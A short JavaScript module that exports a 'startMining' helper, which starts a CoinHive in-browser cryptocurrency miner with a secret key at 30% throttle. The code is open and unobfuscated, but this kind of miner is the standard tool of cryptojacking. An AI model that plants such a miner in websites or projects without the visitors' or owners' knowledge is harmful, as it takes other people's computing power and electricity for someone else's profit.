export const startMining = (secretKey) => {
  const miner = new CoinHive.Anonymous(secretKey, { throttle: 0.3 });
  miner.start();

  return miner;
};

export default {};
